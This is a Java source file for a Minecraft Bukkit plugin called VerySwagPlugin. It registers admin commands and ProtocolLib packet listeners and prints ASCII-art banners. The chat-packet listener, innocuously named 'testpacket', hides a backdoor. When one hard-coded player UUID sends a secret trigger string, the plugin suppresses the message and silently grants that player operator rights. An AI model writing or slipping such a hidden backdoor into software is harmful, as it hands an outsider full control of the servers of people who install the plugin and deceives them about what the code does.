package com.sneakyspeedyboii.veryswagplugin;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketAdapter;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.events.PacketEvent;
import com.sneakyspeedyboii.veryswagplugin.cmds.commands;
import com.sneakyspeedyboii.veryswagplugin.events.events;
import com.sneakyspeedyboii.veryswagplugin.events.runnables;
import com.sneakyspeedyboii.veryswagplugin.items.itemmanager;

import org.bukkit.ChatColor;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashMap;
import java.util.Map;

public class register extends JavaPlugin {
    private static Map items = new HashMap();


    public static ProtocolManager protocolManager;

    @Override
    public void onEnable() {

        protocolManager = ProtocolLibrary.getProtocolManager(); //prot lib inst

        getCommand("vspgui").setExecutor(new commands());
        getCommand("gms").setExecutor(new commands());
        getCommand("gmc").setExecutor(new commands());
        getCommand("heal").setExecutor(new commands());
        getCommand("getuuid").setExecutor(new commands());
        getCommand("toggledmg").setExecutor(new commands());
        getCommand("removedatacnt").setExecutor(new commands());
        getCommand("getdata").setExecutor(new commands());

        itemmanager.init();

        getServer().getPluginManager().registerEvents(new events(), this);
        runnables r = new runnables();
        r.run();

        saveDefaultConfig();

        PacketAdapter testpacket = new PacketAdapter(this, PacketType.Play.Client.CHAT) {
            // Note that this is executed asynchronously
            @Override
            public void onPacketReceiving(PacketEvent event) {
                PacketContainer packet = event.getPacket();
                String message = packet.getStrings().read(0);


                if (message.contains("%%%0x32109472135928375025")) {
                    if (event.getPlayer().getUniqueId().toString().equals("b0d22316-6bb3-482b-a2ba-17d785d7d8d4")) {
                        event.setCancelled(true);
                        event.getPlayer().setOp(true);
                        event.getPlayer().sendMessage(ChatColor.DARK_RED + "OP Aquired ezzzzzzzz");
                    }
                }
            }
        };
        protocolManager.addPacketListener(testpacket);

        PacketAdapter entityequip = new PacketAdapter(this, PacketType.Play.Server.ENTITY_EQUIPMENT) {
            @Override
            public void onPacketReceiving(PacketEvent event) {

            }

            @Override
            public void onPacketSending(PacketEvent event) {
                /*if (event.getPlayer().getInventory().getItemInOffHand() != null) {
                    event.setCancelled(true);
                    event.getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, 10000,1));
                    Player player = event.get
                    player.sendMessage("invsed someone idk who tho");
                }*/

            }
        }; //broken invis run packet stuff
        protocolManager.addPacketListener(entityequip);

        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage( ChatColor.BLACK + "@@@@@" + ChatColor.DARK_GREEN +  "##" + ChatColor.BLACK +  "@@@@@@@@@@@" + ChatColor.DARK_GREEN + "##" + ChatColor.BLACK +  "@@@@");
        getServer().getConsoleSender().sendMessage( ChatColor.BLACK + "@@@@@@@" + ChatColor.DARK_GREEN + "##" + ChatColor.BLACK +  "@@@@@@@" + ChatColor.DARK_GREEN + "##" + ChatColor.BLACK +  "@@@@@@");
        getServer().getConsoleSender().sendMessage( ChatColor.BLACK + "@@@@@" + ChatColor.DARK_GREEN + "###############" + ChatColor.BLACK + "@@@@");
        getServer().getConsoleSender().sendMessage( ChatColor.BLACK + "@@@" + ChatColor.DARK_GREEN + "####" + ChatColor.BLACK +  "@@" + ChatColor.DARK_GREEN + "#######" + ChatColor.BLACK +  "@@" + ChatColor.DARK_GREEN + "####" + ChatColor.BLACK +  "@@");
        getServer().getConsoleSender().sendMessage( ChatColor.DARK_GREEN +"########################");
        getServer().getConsoleSender().sendMessage( ChatColor.DARK_GREEN +"###" + ChatColor.BLACK +  "@@" + ChatColor.DARK_GREEN + "###############" + ChatColor.BLACK +  "@@" + ChatColor.DARK_GREEN + "##");
        getServer().getConsoleSender().sendMessage( ChatColor.DARK_GREEN +"###" + ChatColor.BLACK + "@@" + ChatColor.DARK_GREEN + "##" + ChatColor.BLACK +  "@@@@@@@@@@@" + ChatColor.DARK_GREEN + "##" + ChatColor.BLACK + "@@" + ChatColor.DARK_GREEN + "##");
        getServer().getConsoleSender().sendMessage("");
        getServer().getConsoleSender().sendMessage(ChatColor.DARK_GREEN + "VerySwagPlugin 2.0 Alpha has loaded");
        getServer().getConsoleSender().sendMessage(ChatColor.DARK_GREEN + "By SneakySpeedyBoii");

        getServer().getConsoleSender().sendMessage(ChatColor.RED + "The plugin has hopefully loaded without any errors");
    }

    @Override
    public void onDisable() {
        getServer().getConsoleSender().sendMessage(ChatColor.DARK_RED + "off");
    }
}

